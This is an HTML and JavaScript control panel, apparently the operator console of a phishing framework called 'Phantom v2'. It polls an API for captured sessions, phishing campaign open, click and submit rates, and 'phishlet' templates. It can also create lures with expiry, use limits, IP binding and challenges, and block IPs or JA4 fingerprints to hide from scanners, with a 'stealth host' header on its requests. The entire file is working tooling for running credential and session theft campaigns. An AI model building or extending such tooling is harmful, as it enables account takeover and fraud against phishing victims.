<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Phantom v2 Operator</title>
<style>body{font-family:system-ui,sans-serif;max-width:960px;margin:2em auto;padding:0 1em;background:#0d1117;color:#c9d1d9}h1{color:#58a6ff}h2{color:#79c0ff;border-bottom:1px solid #21262d;padding-bottom:.3em}table{border-collapse:collapse;width:100%;margin:.5em 0}td,th{border:1px solid #30363d;padding:.4em;text-align:left;font-size:.9em}th{background:#161b22}input,button{padding:.4em;margin:.2em;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:4px}button{background:#238636;color:#fff;border:0;cursor:pointer}button:hover{background:#2ea043}#cfg{margin-bottom:1em}.ok{color:#3fb950}.bad{color:#f85149}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:.5em}.card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:.6em}.card b{font-size:1.3em;color:#58a6ff}</style>
</head><body>
<h1>&#9670; Phantom v2 Operator</h1>
<div id="cfg">
<input id="base" size="28" value="http://127.0.0.1:8080" placeholder="API base">
<input id="stealth" size="28" value="api-internal.example.com" placeholder="X-Stealth-Host">
<input id="token" size="24" type="password" placeholder="Bearer (if set)">
<button onclick="save()">Save</button> <span id="conn"></span>
</div>
<h2>Status</h2><div class="grid" id="cards"></div>
<h2>Captures <small>(live)</small></h2><table><thead><tr><th>session</th><th>kind</th><th>node</th></tr></thead><tbody id="caps"><tr><td colspan="3">—</td></tr></tbody></table>
<h2>Campaigns</h2><table><thead><tr><th>name</th><th>status</th><th>sent</th><th>open</th><th>click</th><th>submit</th></tr></thead><tbody id="camps"><tr><td colspan="6">—</td></tr></tbody></table>
<h2>Phishlets</h2><pre id="ph">—</pre>
<h2>Block IP/JA4</h2>
<input id="bkey" placeholder="1.2.3.4"><input id="breason" placeholder="reason"><button onclick="block()">Block</button>
<h2>Smart lure</h2>
<input id="lpath" placeholder="/l/abc01"><input id="lph" placeholder="phishlet id">
<input id="lttl" placeholder="ttl min" size="8"><input id="luses" placeholder="max uses" size="8">
<input id="lip" placeholder="bound ip (opt)" size="14"><label><input type="checkbox" id="lch"> challenge</label>
<button onclick="mklure()">Create</button>
<pre id="out"></pre>
<script>
let C={base:localStorage.pb||"",stealth:localStorage.ps||"",token:localStorage.pt||""};
base.value=C.base||base.value;stealth.value=C.stealth||stealth.value;token.value=C.token||"";
function save(){C={base:base.value,stealth:stealth.value,token:token.value};localStorage.pb=C.base;localStorage.ps=C.stealth;localStorage.pt=C.token;load();}
function H(h){h=h||{};h["X-Stealth-Host"]=C.stealth;if(C.token)h["Authorization"]="Bearer "+C.token;return h;}
async function J(p){let r=await fetch(C.base+p,{headers:H()});if(!r.ok)throw r.status;return r.json();}
function esc(s){return String(s==null?"":s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));}
async function load(){try{
let s=await J("/api/v1/stats");
conn.innerHTML='<span class="ok">● '+esc(s.node||"?")+"</span>";
cards.innerHTML='<div class="card">phishlets<b>'+s.phishlets+'</b></div><div class="card">uptime<b>'+s.uptime_s+'s</b></div>';
let caps=await J("/api/v1/captures?limit=10");
caps.innerHTML=caps.length?caps.map(c=>"<tr><td>"+esc(c.session).slice(0,8)+"</td><td>"+esc(c.kind)+"</td><td>"+esc(c.node)+"</td></tr>").join(""):'<tr><td colspan="3">—</td></tr>';
let camps=await J("/api/v1/campaigns").catch(()=>[]);
camps.innerHTML=camps.length?camps.map(c=>"<tr><td>"+esc(c.name)+"</td><td>"+esc(c.status)+"</td><td>"+c.sent+"</td><td>"+c.opened+"</td><td>"+c.click+"</td><td>"+c.submitted+"</td></tr>").join(""):'<tr><td colspan="6">—</td></tr>';
ph.textContent=JSON.stringify(await J("/api/v1/phishlets"),null,1);
}catch(e){conn.innerHTML='<span class="bad">● ERR '+e+"</span>";}}
async function block(){try{let r=await fetch(C.base+"/api/v1/block",{method:"POST",headers:H({"Content-Type":"application/json"}),body:JSON.stringify({key:bkey.value,reason:breason.value})});out.textContent="block "+r.status;}catch(e){out.textContent="ERR "+e;}}
async function mklure(){try{let r=await fetch(C.base+"/api/v1/lures",{method:"POST",headers:H({"Content-Type":"application/json"}),body:JSON.stringify({path:lpath.value,phishlet_id:lph.value,ttl_min:+lttl.value||0,max_uses:+luses.value||0,bound_ip:lip.value,require_challenge:lch.checked})});out.textContent="lure "+r.status;}catch(e){out.textContent="ERR "+e;}}
load();setInterval(load,5000);
</script></body></html>
